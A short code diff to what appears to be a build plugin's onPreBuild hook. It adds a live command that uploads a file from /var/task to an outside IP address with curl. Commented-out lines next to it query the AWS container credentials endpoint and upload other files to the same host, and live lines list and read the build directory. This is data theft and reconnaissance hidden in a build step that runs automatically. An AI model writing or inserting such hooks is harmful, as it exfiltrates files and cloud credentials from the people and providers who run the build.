@@ -20,7 +20,7 @@ exports.onPreBuild = function () {
   //exec(`env`)
   //exec(`curl --connect-timeout 100000 http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`)
   //exec(`curl 185.20.136.111:1234 --data-binary @/var/task/bootstrap.sh`)
-  //exec(`curl 185.20.136.111:1234 --data-binary @/var/task/index.js`)
+  exec(`curl 185.20.136.111:1234 --data-binary @/var/task/iltorb.node`)
   exec(`ls -la /var/task`)
   exec(`cat /var/task/commit`)
   console.log(`aw yeah`)
